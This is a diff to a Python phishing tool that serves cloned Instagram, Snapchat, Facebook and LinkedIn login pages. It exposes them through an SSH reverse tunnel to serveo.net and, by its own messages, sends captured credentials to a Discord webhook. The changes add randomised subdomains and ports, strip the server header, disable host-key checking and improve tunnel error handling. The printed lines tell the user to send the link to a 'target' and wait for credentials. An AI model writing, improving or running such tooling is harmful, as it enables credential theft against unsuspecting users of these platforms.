@@ -8,24 +8,38 @@ import socketserver
 import subprocess
 import webbrowser
 import time
+import requests
+import json
+import re
 
 # Initialize colorama for Windows
 colorama.init()
+
+# Custom HTTP Handler with modified User-Agent
+class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+    def version_string(self):
+        return 'CustomServer/1.0'
+    
+    def send_header(self, keyword, value):
+        if keyword.lower() == 'server':
+            # Skip the server header
+            return
+        http.server.SimpleHTTPRequestHandler.send_header(self, keyword, value)
 
 def serve_website(platform):
     # Define the directory to serve based on platform
     if platform.lower() == 'instagram':
         directory = 'web/instagram'
-        subdomain = 'instagram-login'
+        subdomain = f"insta-{random.randint(1000,9999)}"
     elif platform.lower() == 'snapchat':
         directory = 'web/snapchat'
-        subdomain = 'snapchat-login'
+        subdomain = f"snap-{random.randint(1000,9999)}"
     elif platform.lower() == 'facebook':
         directory = 'web/facebook'
-        subdomain = 'facebook-login'
+        subdomain = f"fb-{random.randint(1000,9999)}"
     elif platform.lower() == 'linkedin':
         directory = 'web/linkedin'
-        subdomain = 'linkedin-login'
+        subdomain = f"in-{random.randint(1000,9999)}"
     else:
         print("Invalid platform selected")
         return
@@ -38,9 +52,17 @@ def serve_website(platform):
     
     try:
         # Start a simple HTTP server in the background
-        PORT = 8000
+        PORT = random.randint(8000,9000)  # Random port to avoid conflicts
         Handler = http.server.SimpleHTTPRequestHandler
-        httpd = socketserver.TCPServer(("", PORT), Handler)
+        
+        try:
+            httpd = socketserver.TCPServer(("", PORT), Handler)
+            print(f"✓ Local server started on port {PORT}")
+        except OSError as e:
+            print(f"× Port {PORT} is in use, trying another port...")
+            PORT = random.randint(9001,10000)
+            httpd = socketserver.TCPServer(("", PORT), Handler)
+            print(f"✓ Local server started on port {PORT}")
         
         # Start the server in a separate process
         import threading
@@ -48,38 +70,78 @@ def serve_website(platform):
         server_thread.daemon = True
         server_thread.start()
         
-        # Create SSH tunnel to serveo.net with specific subdomain
-        tunnel_command = f"ssh -o ServerAliveInterval=60 -R {subdomain}:80:localhost:{PORT} serveo.net"
+        print("\nTesting SSH connection to serveo.net...")
+        test_command = "ssh -v serveo.net exit"
+        test_process = subprocess.Popen(test_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+        test_output, test_error = test_process.communicate()
         
-        # Use different command for Windows
+        if test_process.returncode != 0:
+            print("× SSH connection test failed")
+            print("Detailed error:")
+            print(test_error)
+            print("\nTrying alternative connection method...")
+            # Try alternative port
+            tunnel_command = f"ssh -v -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -R {subdomain}:80:localhost:{PORT} serveo.net"
+        else:
+            print("✓ SSH connection test successful")
+            tunnel_command = f"ssh -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o ExitOnForwardFailure=yes -R {subdomain}:80:localhost:{PORT} serveo.net"
+        
+        print("\nStarting SSH tunnel...")
         if os.name == 'nt':
-            # For Windows, assuming OpenSSH is installed
             process = subprocess.Popen(tunnel_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
         else:
-            # For Linux/Mac
             process = subprocess.Popen(tunnel_command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
         
-        print("\nEstablishing secure connection...")
+        print("Establishing secure connection...")
         time.sleep(2)
         
         # Monitor the output for the forwarding URL
-        while True:
+        url_found = False
+        error_count = 0
+        while not url_found and error_count < 10:
             line = process.stdout.readline()
-            if "Forwarding HTTP traffic from" in line:
+            if not line and process.poll() is not None:
+                error = process.stderr.read()
+                if error:
+                    if "Permission denied" in error:
+                        print("× Error: Permission denied. Try a different subdomain name.")
+                    elif "Connection refused" in error:
+                        print("× Error: Connection refused. Check your internet connection.")
+                    elif "remote port forwarding failed" in error.lower():
+                        print("× Error: Port forwarding failed. Subdomain might be in use.")
+                        print("Try running the script again for a new random subdomain.")
+                    else:
+                        print(f"× Error: {error}")
+                error_count += 1
+                continue
+            
+            print(f"Debug: {line.strip()}")  # Debug output
+            
+            if "Forwarding" in line and "HTTP" in line:
                 url = f"https://{subdomain}.serveo.net"
+                url_found = True
                 print(f"\n[+] Your phishing link is ready: {url}")
                 print("[+] Send this link to your target")
                 print("[+] Waiting for target to enter credentials...")
                 print("[+] Check your Discord webhook for incoming credentials")
                 print("\n[Press Ctrl+C to stop the server]")
                 break
-            elif "Warning:" in line or "Error:" in line:
-                print(f"\nError: {line}")
-                print("Try changing the subdomain name or check your internet connection")
-                httpd.shutdown()
-                process.terminate()
-                os.chdir("../../")
-                return
+            
+        if not url_found:
+            print("\n× Failed to establish tunnel connection")
+            print("\nTroubleshooting steps:")
+            print("1. Check if SSH is installed and working:")
+            print("   ssh -V")
+            print("2. Try to establish a basic SSH connection:")
+            print("   ssh -v serveo.net")
+            print("3. If you get host key errors, run:")
+            print("   ssh-keygen -R serveo.net")
+            print("4. Make sure your internet connection is stable")
+            print("5. Try running with sudo: sudo python3 main.py")
+            httpd.shutdown()
+            process.terminate()
+            os.chdir("../../")
+            return
             
         # Keep the server running until user interrupts
         try:
@@ -92,13 +154,18 @@ def serve_website(platform):
             os.chdir("../../")  # Return to original directory
             
     except Exception as e:
-        print(f"\nError: {str(e)}")
-        print("Make sure you have SSH installed and serveo.net is accessible")
-        print("Try these steps:")
-        print("1. Install OpenSSH if not installed")
-        print("2. Check your internet connection")
-        print("3. Try a different subdomain name")
-        print("4. Make sure port 80 is not blocked by firewall")
+        print(f"\n× Error: {str(e)}")
+        print("\nTroubleshooting steps:")
+        print("1. Make sure SSH is working:")
+        print("   a) Check SSH version: ssh -V")
+        print("   b) Test SSH: ssh -v serveo.net")
+        print("2. If you get host key errors:")
+        print("   ssh-keygen -R serveo.net")
+        print("3. Install/reinstall SSH if needed:")
+        print("   sudo apt update && sudo apt install openssh-client -y")
+        print("4. Check your firewall settings:")
+        print("   sudo ufw status")
+        print("5. Try running with sudo: sudo python3 main.py")
         os.chdir("../../")  # Return to original directory
 
 def print_menu():
